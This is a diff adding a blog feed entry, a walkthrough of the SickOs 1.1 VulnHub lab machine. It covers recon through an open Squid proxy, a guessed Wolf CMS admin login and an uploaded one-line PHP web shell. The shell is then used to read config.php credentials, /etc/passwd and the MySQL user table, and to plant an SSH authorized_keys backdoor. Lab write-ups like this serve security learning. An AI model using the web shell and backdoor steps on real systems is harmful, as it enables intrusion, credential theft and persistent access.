@@ -4,7 +4,7 @@
   <title><![CDATA[0x73696e65]]></title>
   <link href="http://73696e65.github.io/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-08-25T21:46:37+02:00</updated>
+  <updated>2015-12-12T12:41:40+01:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -12,6 +12,728 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[SickOs: 1.1]]></title>
+    <link href="http://73696e65.github.io/blog/2015/12/12/sickos-1-dot-1/"/>
+    <updated>2015-12-12T11:21:39+01:00</updated>
+    <id>http://73696e65.github.io/blog/2015/12/12/sickos-1-dot-1</id>
+    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs: 1.1</a></p>
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ nmap 192.168.80.169
+</span><span class='line'>22/tcp   open   ssh
+</span><span class='line'>3128/tcp open   squid-http
+</span><span class='line'>8080/tcp closed http-proxy</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is an open proxy, we try internal network reconnaissance:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 http://192.168.80.169
+</span><span class='line'>&lt;h1>
+</span><span class='line'>BLEHHH!!!
+</span><span class='line'>&lt;/h1></span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ dirb http://192.168.80.169:80 -p 192.168.80.169:3128
+</span><span class='line'>...
+</span><span class='line'>+ http://192.168.80.169:80/cgi-bin/ (CODE:403|SIZE:290)
+</span><span class='line'>+ http://192.168.80.169:80/connect (CODE:200|SIZE:109)
+</span><span class='line'>+ http://192.168.80.169:80/index (CODE:200|SIZE:21)
+</span><span class='line'>+ http://192.168.80.169:80/index.php (CODE:200|SIZE:21)
+</span><span class='line'>+ http://192.168.80.169:80/robots (CODE:200|SIZE:45)
+</span><span class='line'>+ http://192.168.80.169:80/robots.txt (CODE:200|SIZE:45)
+</span><span class='line'>+ http://192.168.80.169:80/server-status (CODE:403|SIZE:295)</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 http://192.168.80.169:80/robots.txt
+</span><span class='line'>User-agent: *
+</span><span class='line'>Disallow: /
+</span><span class='line'>Dissalow: /wolfcms</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 http://192.168.80.169:80/connect
+</span><span class='line'>#!/usr/bin/python
+</span><span class='line'>
+</span><span class='line'>print "I Try to connect things very frequently\n"
+</span><span class='line'>print "You may want to try my services"</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 http://192.168.80.169:80/wolfcms/</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We found the Wolf CMS and to have easier access, we set the HTTP proxy in
+Firefox. After a little googling, we found this
+<a href="https://www.exploit-db.com/exploits/36818/">exploit</a>, but it only uploads php
+shell and we can do this manually. To use this technique, we need credentials to log in via
+<a href="http://192.168.80.169/wolfcms/?/admin/">admin interface</a>. One of our first guesses was
+<code>admin/admin</code>, so we upload the file with the following content for RCE:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nx">cmd</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As we can read in exploit, the uploaded files are available in <code>public</code> directory. Invoking a few commands:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la
+</span><span class='line'>total 20
+</span><span class='line'>drwxrwxrwx 4 root     root     4096 Dec 12 12:25 .
+</span><span class='line'>drwxr-xr-x 5 root     root     4096 Dec  5 06:33 ..
+</span><span class='line'>-rw-r--r-- 1 www-data www-data   32 Dec 12 12:29 a.php
+</span><span class='line'>drwxrwxrwx 2 root     root     4096 Dec  5 06:05 images
+</span><span class='line'>drwxrwxrwx 4 root     root     4096 Dec  5 06:05 themes</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+../"
+</span><span class='line'>total 52
+</span><span class='line'>drwxr-xr-x 5 root root 4096 Dec  5 06:33 .
+</span><span class='line'>drwxrwxrwx 3 root root 4096 Dec  6 21:15 ..
+</span><span class='line'>-rwxr-xr-x 1 root root  950 Dec  5 06:15 .htaccess
+</span><span class='line'>-rwxrwxrwx 1 root root 4084 Dec  5 06:15 CONTRIBUTING.md
+</span><span class='line'>-rwxrwxrwx 1 root root 2405 Dec  5 06:15 README.md
+</span><span class='line'>-rwxrwxrwx 1 root root  403 Dec  5 06:15 composer.json
+</span><span class='line'>-rwxrwxrwx 1 root root 3058 Dec  5 07:26 config.php
+</span><span class='line'>drwxrwxrwx 2 root root 4096 Dec  5 06:15 docs
+</span><span class='line'>-rwxrwxrwx 1 root root  894 Dec  5 06:15 favicon.ico
+</span><span class='line'>-rwxrwxrwx 1 root root 6815 Dec  5 06:32 index.php
+</span><span class='line'>drwxrwxrwx 4 root root 4096 Dec 12 12:25 public
+</span><span class='line'>-rwxrwxrwx 1 root root    0 Dec  5 06:15 robots.txt
+</span><span class='line'>drwxrwxrwx 7 root root 4096 Dec  5 06:25 wolf</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 http://192.168.80.169/wolfcms/public/a.php?cmd=netstat+-nalutp
+</span><span class='line'>Active Internet connections (servers and established)
+</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+</span><span class='line'>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+</span><span class='line'>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+</span><span class='line'>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60664    TIME_WAIT   -
+</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60665    TIME_WAIT   -
+</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60667    ESTABLISHED -
+</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60666    TIME_WAIT   -
+</span><span class='line'>tcp        1      0 192.168.80.169:80       192.168.80.169:60662    CLOSE_WAIT  -
+</span><span class='line'>tcp        1      0 192.168.80.169:80       192.168.80.169:60663    CLOSE_WAIT  -
+</span><span class='line'>tcp        1      0 192.168.80.169:80       192.168.80.169:60661    CLOSE_WAIT  -
+</span><span class='line'>tcp6       0      0 :::22                   :::*                    LISTEN      -
+</span><span class='line'>tcp6       0      0 :::3128                 :::*                    LISTEN      -
+</span><span class='line'>tcp6       0      0 192.168.80.169:60667    192.168.80.169:80       ESTABLISHED -
+</span><span class='line'>tcp6       0      0 192.168.80.169:3128     192.168.80.137:54390    ESTABLISHED -
+</span><span class='line'>udp        0      0 192.168.80.169:45534    192.168.80.2:53         ESTABLISHED 1703/netstat
+</span><span class='line'>udp        0      0 192.168.80.169:37938    192.168.80.2:53         ESTABLISHED 1701/netstat
+</span><span class='line'>udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+</span><span class='line'>udp        0      0 192.168.80.169:39007    192.168.80.2:53         ESTABLISHED 1705/netstat
+</span><span class='line'>udp        0      0 0.0.0.0:53488           0.0.0.0:*                           -
+</span><span class='line'>udp6       0      0 :::43051</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here we found the database user credentials:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=cat+../config.php"
+</span><span class='line'>&lt;?php
+</span><span class='line'>
+</span><span class='line'>// Database information:
+</span><span class='line'>// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
+</span><span class='line'>// The path can only be absolute path or :memory:
+</span><span class='line'>// For more info look at: www.php.net/pdo
+</span><span class='line'>
+</span><span class='line'>// Database settings:
+</span><span class='line'>define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
+</span><span class='line'>define('DB_USER', 'root');
+</span><span class='line'>define('DB_PASS', 'john@123');
+</span><span class='line'>define('TABLE_PREFIX', '');
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Examining the MySQL database:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=echo+mysql+-uroot+-pjohn@123+-e+status"
+</span><span class='line'>mysql -uroot -pjohn@123 -e status
+</span><span class='line'>
+</span><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e+status"
+</span><span class='line'>--------------
+</span><span class='line'>mysql  Ver 14.14 Distrib 5.5.46, for debian-linux-gnu (i686) using readline 6.2
+</span><span class='line'>
+</span><span class='line'>Connection id:          149
+</span><span class='line'>Current database:
+</span><span class='line'>Current user:           root@localhost
+</span><span class='line'>SSL:                    Not in use
+</span><span class='line'>Current pager:          stdout
+</span><span class='line'>Using outfile:          ''
+</span><span class='line'>Using delimiter:        ;
+</span><span class='line'>Server version:         5.5.46-0ubuntu0.12.04.2 (Ubuntu)
+</span><span class='line'>Protocol version:       10
+</span><span class='line'>Connection:             Localhost via UNIX socket
+</span><span class='line'>Server characterset:    latin1
+</span><span class='line'>Db     characterset:    latin1
+</span><span class='line'>Client characterset:    latin1
+</span><span class='line'>Conn.  characterset:    latin1
+</span><span class='line'>UNIX socket:            /var/run/mysqld/mysqld.sock
+</span><span class='line'>Uptime:                 1 hour 1 min 49 sec
+</span><span class='line'>
+</span><span class='line'>Threads: 1  Questions: 2646  Slow queries: 0  Opens: 64  Flush tables: 1  Open tables: 57  Queries per second avg: 0.713
+</span><span class='line'>
+</span><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e'show+databases'"
+</span><span class='line'>Database
+</span><span class='line'>information_schema
+</span><span class='line'>mysql
+</span><span class='line'>performance_schema
+</span><span class='line'>wolf</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e'show+tables'"
+</span><span class='line'>Tables_in_wolf
+</span><span class='line'>cron
+</span><span class='line'>layout
+</span><span class='line'>page
+</span><span class='line'>page_part
+</span><span class='line'>page_tag
+</span><span class='line'>permission
+</span><span class='line'>plugin_settings
+</span><span class='line'>role
+</span><span class='line'>role_permission
+</span><span class='line'>secure_token
+</span><span class='line'>setting
+</span><span class='line'>snippet
+</span><span class='line'>tag
+</span><span class='line'>user
+</span><span class='line'>user_role</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e'select+*+from+user'"
+</span><span class='line'>id      name    email   username        password        salt    language        last_login      last_failure    failure_count   created_on      updated_on created_by_id   updated_by_id
+</span><span class='line'>1       Administrator   admin@yoursite.com      admin   3a1be46a798dce0d880f633ce195b676839a0ce344c917a7ea1270816dcb649ce1e2b811b56fe93c9d3c4e679151180129ee9483ea39bff4d4578c4be6c77e1f   6806b774443f2c34231eceddf156a42d3c26a2b5219ee9d55f5e3c9aea534167        en      2015-12-12 12:23:33     NULL       0       2015-12-05 06:25:06     2015-12-12 12:23:33     1       NULL</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nothing interesting here, there is only one user and we already know his password.</p>
+
+<p>We noticed that the user <code>www-data</code> has shell access:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=cat+/etc/passwd"
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
+</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
+</span><span class='line'>messagebus:x:102:105::/var/run/dbus:/bin/false
+</span><span class='line'>whoopsie:x:103:106::/nonexistent:/bin/false
+</span><span class='line'>landscape:x:104:109::/var/lib/landscape:/bin/false
+</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
+</span><span class='line'>mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next idea is to upload ssh authorization key and log in via ssh.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=id"
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data"
+</span><span class='line'>total 24
+</span><span class='line'>drwxrwxrwx  3 root root 4096 Dec  6 21:15 .
+</span><span class='line'>drwxr-xr-x 13 root root 4096 Dec 12 11:55 ..
+</span><span class='line'>-rwxrwxrwx  1 root root  109 Dec  5 07:57 connect.py
+</span><span class='line'>-rw-r--r--  1 root root   21 Dec  5 06:05 index.php
+</span><span class='line'>-rw-r--r--  1 root root   45 Dec  5 06:05 robots.txt
+</span><span class='line'>drwxr-xr-x  5 root root 4096 Dec  5 06:33 wolfcms
+</span><span class='line'>
+</span><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=mkdir+~www-data/.ssh"
+</span><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data"
+</span><span class='line'>total 28
+</span><span class='line'>drwxrwxrwx  4 root     root     4096 Dec 12 13:07 .
+</span><span class='line'>drwxr-xr-x 13 root     root     4096 Dec 12 11:55 ..
+</span><span class='line'>drwxr-xr-x  2 www-data www-data 4096 Dec 12 13:07 .ssh
+</span><span class='line'>-rwxrwxrwx  1 root     root      109 Dec  5 07:57 connect.py
+</span><span class='line'>-rw-r--r--  1 root     root       21 Dec  5 06:05 index.php
+</span><span class='line'>-rw-r--r--  1 root     root       45 Dec  5 06:05 robots.txt
+</span><span class='line'>drwxr-xr-x  5 root     root     4096 Dec  5 06:33 wolfcms</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We created the directory for <code>authorized_keys</code> file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ ssh-keygen -P "" -f blabla
+</span><span class='line'>Generating public/private rsa key pair.
+</span><span class='line'>Your identification has been saved in blabla.
+</span><span class='line'>Your public key has been saved in blabla.pub.
+</span><span class='line'>The key fingerprint is:
+</span><span class='line'>4d:31:fb:7e:bd:82:c9:7f:21:ce:51:91:f3:76:a3:14 root@kali32
+</span><span class='line'>The key's randomart image is:
+</span><span class='line'>+---[RSA 2048]----+
+</span><span class='line'>|          o     .|
+</span><span class='line'>|           + E + |
+</span><span class='line'>|          o   . +|
+</span><span class='line'>|         o . . o+|
+</span><span class='line'>|        S . o o.o|
+</span><span class='line'>|           . + o |
+</span><span class='line'>|          . * + o|
+</span><span class='line'>|           + = ..|
+</span><span class='line'>|            ..o. |
+</span><span class='line'>+-----------------+
+</span><span class='line'>
+</span><span class='line'>root@kali32:~$ cat blabla.pub
+</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq+yGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA+1i14Mfp6kxskoW5/+8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k+rY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid+8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX root@kali32</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To encode spaces:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ cat blabla.pub  | sed 's#+#%2b#g'
+</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq%2byGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA%2b1i14Mfp6kxskoW5/%2b8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k%2brY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid%2b8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX root@kali32</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To store public key:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=echo+'ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq%2byGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA%2b1i14Mfp6kxskoW5/%2b8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k%2brY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid%2b8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX'>~www-data/.ssh/authorized_keys"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We verify successful upload:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=cat+~www-data/.ssh/authorized_keys"
+</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq+yGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA+1i14Mfp6kxskoW5/+8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k+rY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid+8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX</span></code></pre></td></tr></table></div></figure>
+
+
